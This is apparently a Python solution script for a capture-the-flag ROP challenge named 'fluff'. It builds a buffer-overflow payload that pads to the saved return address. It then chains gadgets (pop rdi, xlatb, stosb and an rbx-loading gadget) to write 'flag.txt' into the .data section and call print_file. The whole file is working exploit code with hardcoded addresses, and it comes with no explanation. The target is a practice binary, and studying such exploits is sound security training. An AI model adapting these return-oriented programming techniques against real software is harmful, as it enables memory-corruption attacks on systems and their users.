import struct

buf_addr       = 0x7fffffffe0e0
saved_rip_addr = 0x7fffffffe108

file_start_addr = 0x400000

print_file_addr = 0x400510
data_addr       = 0x601028

pop_rdi_addr    = 0x4006a3
load_rbx_addr   = 0x40062a
xlatb_addr      = 0x400628
stosb_addr      = 0x400639

def find_char_index(char):
    ### Argument <char> is a single character as a string or byte.
    if isinstance(char, str):
        char = char.encode("utf-8")
    elif isinstance(char, int):
        char = bytes([char])
        
    with open("fluff", "rb") as f:
        contents = f.read()
        
    if char in contents:
        return contents.index(char)
    else:
        raise ValueError(char.decode("utf-8"), "is not in fluff!")

class Exploit():
    def __init__(self):
        self.payload = b""

        self.al = 0xb

        self.hints = []

    def pad(self, num_bytes):
        self.payload += b"a" * num_bytes
        self.hints.extend(["padding"] * (num_bytes//8))

    def append_word(self, word, hint = ""):
        self.payload += struct.pack("<Q", word)
        
        self.hints.append(hint)

    def append_write_chain(self, to_write, location):
        ### Write the string.
        for i, c in enumerate(to_write):
            self.append_load_al_chain(c)
            self.append_pop_rdi_chain(location + i)
            self.append_word(stosb_addr, hint = "stosb")

        ### We don't actually need a NULL byte in this case
        ### because the .data section is initialized to 0.
        return
        ### Write a NULL byte.
        self.append_load_al_chain(0)
        self.append_pop_rdi_chain(location + len(to_write))
        self.append_word(stosb_addr, hint = "stosb")

    def append_pop_rdi_chain(self, rdi):
        self.append_word(pop_rdi_addr, hint = "pop rdi")
        self.append_word(rdi, hint = "new rdi value")

    def append_load_rbx_chain(self, rbx):
        ### Low byte of rdx tells which bit to start copying at.
        ### Next byte of rdx tells how many bytes to copy.
        self.append_word(load_rbx_addr, hint = "load rbx")
        self.append_word(0x4000, hint = "bit directions")
        self.append_word(rbx - 0x3ef2, hint = "rbx - 0x3ef2")

    def append_load_al_chain(self, al):
        ### First we need to locate the requested byte in the file.
        idx = find_char_index(al)

        table_start = file_start_addr + idx - self.al

        ### Now we load this address into rbx.
        self.append_load_rbx_chain(table_start)

        self.append_word(xlatb_addr, hint = "xlatb to load al = " + str(al))

        if not isinstance(al, int):
            al = ord(al)
        self.al = al
        
    def write(self, filename):
        with open(filename, "wb") as f:
            f.write(self.payload)
        print("Wrote {} (0x{:x}) bytes to {}".format(len(self.payload),
                                                   len(self.payload),
                                                   filename))

    def show_with_hints(self):
        for i in range(len(self.payload) // 8):
            chunk = self.payload[8*i: 8*i + 8]

            print("0x{:016x}".format(int.from_bytes(chunk, "little")),
                  "   ->", self.hints[i])

exploit = Exploit()

exploit.pad(saved_rip_addr - buf_addr)

exploit.append_write_chain("flag.txt", data_addr)

exploit.append_pop_rdi_chain(data_addr)

exploit.append_word(print_file_addr, hint = "print_file")

exploit.show_with_hints()

exploit.write("payload")
